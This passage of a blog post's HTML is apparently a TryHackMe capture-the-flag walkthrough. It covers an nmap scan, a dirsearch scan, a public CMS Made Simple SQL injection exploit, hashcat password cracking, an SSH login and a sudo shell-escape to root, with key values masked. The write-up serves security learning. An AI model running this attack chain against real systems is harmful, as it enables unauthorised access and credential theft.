</span></span><span class=line><span class=cl>2222/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 <span class=o>(</span>Ubuntu Linux<span class=p>;</span> protocol 2.0<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span> ssh-hostkey: 
</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>2048</span> 29:42:69:14:9e:ca:d9:17:98:8c:27:72:3a:cd:a9:23 <span class=o>(</span>RSA<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span> ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCj5RwZ5K4QU12jUD81IxGPdEmWFigjRwFNM2pVBCiIPWiMb+R82pdw5dQPFY0JjjicSysFN3pl8ea2L8acocd/7zWke6ce50tpHaDs8OdBYLfpkh+OzAsDwVWSslgKQ7rbi/ck1FF1LIgY7UQdo5FWiTMap7vFnsT/WHL3HcG5Q+el4glnO4xfMMvbRar5WZd4N0ZmcwORyXrEKvulWTOBLcoMGui95Xy7XKCkvpS9RCpJgsuNZ/oau9cdRs0gDoDLTW4S7OI9Nl5obm433k+7YwFeoLnuZnCzegEhgq/bpMo+fXTb/4ILI5bJHJQItH2Ae26iMhJjlFsMqQw0FzLf
</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>256</span> 9b:d1:65:07:51:08:00:61:98:de:95:ed:3a:e3:81:1c <span class=o>(</span>ECDSA<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span> ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBM6Q8K/lDR5QuGRzgfrQSDPYBEBcJ+/2YolisuiGuNIF+1FPOweJy9esTtstZkG3LPhwRDggCp4BP+Gmc92I3eY<span class=o>=</span>
</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>256</span> 12:65:1b:61:cf:4d:e5:75:fe:f4:e8:d4:6e:10:2a:f6 <span class=o>(</span>ED25519<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJ2I73yryK/Q6UFyvBBMUJEfznlIdBXfnrEqQ3lWdymK
</span></span><span class=line><span class=cl>Service Info: OSs: Unix, Linux<span class=p>;</span> CPE: cpe:/o:linux:linux_kernel
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>NSE: Script Post-scanning.
</span></span></code></pre></div><p>dirsearch: <code>dirsearch -u http://&lt;ip></code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>dirsearch -u &lt;http://10.10.138.218&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  _<span class=p>|</span>. _ _  _  _  _ _<span class=p>|</span>_    v0.4.2
</span></span><span class=line><span class=cl> <span class=o>(</span>_<span class=o>||</span><span class=p>|</span> _<span class=o>)</span> <span class=o>(</span>/_<span class=o>(</span>_<span class=o>||</span> <span class=o>(</span>_<span class=p>|</span> <span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Extensions: php, aspx, jsp, html, js <span class=p>|</span> HTTP method: GET <span class=p>|</span> Threads: <span class=m>30</span> <span class=p>|</span> Wordlist size: <span class=m>10927</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Output File: /home/kali/.dirsearch/reports/10.10.138.218/_22-07-02_18-08-57.txt
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Error Log: /home/kali/.dirsearch/logs/errors-22-07-02_18-08-57.log
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Target: &lt;http://10.10.138.218/&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>18:08:58<span class=o>]</span> Starting: 
</span></span><span class=line><span class=cl><span class=o>[</span>18:09:09<span class=o>]</span> <span class=m>403</span> -  299B  - /.ht_wsr.txt                                     
</span></span><span class=line><span class=cl><span class=o>[</span>18:09:09<span class=o>]</span> <span class=m>403</span> -  302B  - /.htaccess.bak1
</span></span><span class=line><span class=cl><span class=o>[</span>18:09:09<span class=o>]</span> <span class=m>403</span> -  304B  - /.htaccess.sample
</span></span><span class=line><span class=cl><span class=o>[</span>18:09:09<span class=o>]</span> <span class=m>403</span> -  302B  - /.htaccess.orig
</span></span><span class=line><span class=cl><span class=o>[</span>18:09:09<span class=o>]</span> <span class=m>403</span> -  302B  - /.htaccess.save
</span></span><span class=line><span class=cl><span class=o>[</span>18:09:09<span class=o>]</span> <span class=m>403</span> -  303B  - /.htaccess_extra
</span></span><span class=line><span class=cl><span class=o>[</span>18:09:09<span class=o>]</span> <span class=m>403</span> -  302B  - /.htaccess_orig
</span></span><span class=line><span class=cl><span class=o>[</span>18:09:09<span class=o>]</span> <span class=m>403</span> -  300B  - /.htaccess_sc
</span></span><span class=line><span class=cl><span class=o>[</span>18:09:09<span class=o>]</span> <span class=m>403</span> -  300B  - /.htaccessBAK
</span></span><span class=line><span class=cl><span class=o>[</span>18:09:09<span class=o>]</span> <span class=m>403</span> -  300B  - /.htaccessOLD
</span></span><span class=line><span class=cl><span class=o>[</span>18:09:09<span class=o>]</span> <span class=m>403</span> -  301B  - /.htaccessOLD2
</span></span><span class=line><span class=cl><span class=o>[</span>18:09:09<span class=o>]</span> <span class=m>403</span> -  292B  - /.htm                                            
</span></span><span class=line><span class=cl><span class=o>[</span>18:09:09<span class=o>]</span> <span class=m>403</span> -  293B  - /.html
</span></span><span class=line><span class=cl><span class=o>[</span>18:09:09<span class=o>]</span> <span class=m>403</span> -  302B  - /.htpasswd_test
</span></span><span class=line><span class=cl><span class=o>[</span>18:09:09<span class=o>]</span> <span class=m>403</span> -  298B  - /.htpasswds
</span></span><span class=line><span class=cl><span class=o>[</span>18:09:09<span class=o>]</span> <span class=m>403</span> -  299B  - /.httr-oauth
</span></span><span class=line><span class=cl><span class=o>[</span>18:09:12<span class=o>]</span> <span class=m>403</span> -  292B  - /.php                                            
</span></span><span class=line><span class=cl><span class=o>[</span>18:10:12<span class=o>]</span> <span class=m>200</span> -   11KB - /index.html                                       
</span></span><span class=line><span class=cl><span class=o>[</span>18:10:34<span class=o>]</span> <span class=m>200</span> -  929B  - /robots.txt                                       
</span></span><span class=line><span class=cl><span class=o>[</span>18:10:35<span class=o>]</span> <span class=m>403</span> -  301B  - /server-status                                    
</span></span><span class=line><span class=cl><span class=o>[</span>18:10:35<span class=o>]</span> <span class=m>403</span> -  302B  - /server-status/                                   
</span></span><span class=line><span class=cl>**<span class=o>[</span>18:10:37<span class=o>]</span> <span class=m>301</span> -  315B  - /simple  -&gt;  &lt;http://10.10.138.218/simple/**&gt;         
</span></span><span class=line><span class=cl>                                                                             
</span></span><span class=line><span class=cl>Task Completed
</span></span></code></pre></div><p>Find CVE: <code>searchsploit ‘CMS Made Simple’</code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>CMS Made Simple &lt; 2.2.10 - SQL Injection <span class=p>|</span> php/webapps/*****.py
</span></span></code></pre></div><p>Find local CVE file: <code>locate 'php/webapps/*****.py'</code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>/usr/share/exploitdb/exploits/php/webapps/*****.py
</span></span></code></pre></div><p><a href=https://www.exploit-db.com/exploits/46635>🔗 CVE</a></p><p>Using CVE:</p><ul><li>Ran <code>sudo apt install 2to3</code> – exploit written in <code>python2</code> has missing modules.</li><li><code>2to3 *****.py</code>, <code>python *****.py -u http://&lt;ip>/simple</code> Note, tried multiple times and then randomly worked… didn’t change anything, ghost in shell moment.</li><li>Also, took two attempts to get correct salt and hash, third attempt again produced different set.</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Salt <span class=k>for</span> password found: *****
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Username found: *****
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Email found: *****
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Password found: *****
</span></span></code></pre></div><p>Crack Password: <code>hashcat -O -a 0 -m 20 '&lt;salt>:&lt;hash>' &lt;wordlist>.txt --show</code></p><ul><li>Note, salt first, then hashed password, used hint for wordlist.</li></ul><p>Connect: <code>ssh *****@&lt;ip> -p 2222</code></p><p>PrivEsc: <code>sudo -*</code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>User mitch may run the following commands on Machine:
</span></span><span class=line><span class=cl>    <span class=o>(</span>root<span class=o>)</span> NOPASSWD: /usr/bin/*******
</span></span></code></pre></div><p>Escalate shell: <code>sudo ***</code>, <code>:!bash</code>, <code>cat /root/root.txt</code></p><p>Thanks for reading and I hope you learned something from this little exercise. This is day 52 of <a href=https://mrashleyball.com/100daysofhacking/>#100DaysOfHacking</a> on the <a href=https://mrashleyball.com/learning-path-for-beginner-hacker/>Hackers Learning Path</a>. <a href=https://go.mrash.co/newsletter>Subscribe</a> for <a href=https://mrashleyball.com/starting-out-in-cyber-security/>CyberSec</a> updates or <a href=https://mrashleyball.com/blog>read</a> more, happy hacking.</p><br><div class=gist-embed-form data-form-type=embedded data-form-id=1489913 data-workspace-id=aw3xhcat version=3></div><script type=text/javascript src=https://forms-widget.getgist.com/ defer></script></div><footer class=post-footer><ul class=post-tags><li><a href=//localhost:1313/tags/tryhackme/>TryHackMe</a></li><li><a href=//localhost:1313/tags/capture-the-flag/>Capture the Flag</a></li><li><a href=//localhost:1313/tags/walkthrough/>Walkthrough</a></li></ul><nav class=paginav><a class=prev href=//localhost:1313/agent-sudo/><span class=title>« Prev</span><br><span>Agent Sudo TryHackMe Walkthrough</span>
</a><a class=next href=//localhost:1313/easily-learn-difficult-things-object-orientated-programming/><span class=title>Next »</span><br><span>Easily Learn Difficult Things: Object Orientated Programming</span></a></nav></footer></article></main><footer class=footer><span>Made with ♥ from Australia</span> •
<span>&copy; 2017-2024 <a href=/policies>Policies</a><br>Site by <a href=//localhost:1313/>Mr Ash Co</a></span>
<span>• Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a>
x
<a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>